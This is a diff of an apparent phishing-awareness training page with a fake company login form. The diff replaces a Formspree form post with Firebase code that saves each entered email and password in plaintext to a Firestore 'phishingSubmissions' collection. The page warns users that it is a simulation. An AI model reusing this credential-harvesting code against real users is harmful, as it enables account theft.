@@ -1,24 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Demo Login - Training Only</title>
+  <title>Demo QR Phishing Login (Firebase Modular SDK)</title>
   <meta charset="UTF-8" />
   <style>
     body { font-family: Arial, sans-serif; padding: 2em; }
     .warning { color: red; font-weight: bold; }
     form { margin-top: 2em; max-width: 300px; }
-    #result { margin-top: 2em; color: blue; font-weight: bold; }
+    #result { margin-top: 1.5em; color: blue; font-weight: bold; }
   </style>
 </head>
 <body>
   <h2>Company Login (Demo)</h2>
-  <p class="warning">WARNING: This is a training simulation. Do not use real credentials!</p>
-  
-  <form id="loginForm" action="https://formspree.io/f/mvgqvrrq" method="POST">
-    <input id="email" type="email" name="email" placeholder="Email" required /><br /><br />
-    <input id="password" type="password" name="password" placeholder="Password" required /><br /><br />
+  <p class="warning">WARNING: This is a training simulation. Do NOT enter real credentials!</p>
+
+  <form id="loginForm">
+    <input id="email" type="email" placeholder="Email" required /><br/><br/>
+    <input id="password" type="password" placeholder="Password" required /><br/><br/>
     <button type="submit">Login</button>
   </form>
 
+  <div id="result"></div>
+
+  <script type="module">
+    // Import the necessary Firebase SDK functions
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyAWvBbs9eg8nqVOmrKcO8ScLvz9nkbCib8",
+      authDomain: "qrphishingdemo.firebaseapp.com",
+      projectId: "qrphishingdemo",
+      storageBucket: "qrphishingdemo.firebasestorage.app",
+      messagingSenderId: "1042237133674",
+      appId: "1:1042237133674:web:a3728e57efae5237990b13",
+      measurementId: "G-HHRH945368"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const loginForm = document.getElementById('loginForm');
+    const resultDiv = document.getElementById('result');
+
+    loginForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      try {
+        await addDoc(collection(db, "phishingSubmissions"), {
+          email: email,
+          password: password,
+          timestamp: serverTimestamp()
+        });
+        resultDiv.textContent = 'Your data was captured! In a real attack, this info would go to attackers.';
+      } catch (error) {
+        resultDiv.textContent = 'Error capturing data: ' + error.message;
+      }
+
+      loginForm.reset();
+    });
+  </script>
 </body>
 </html>
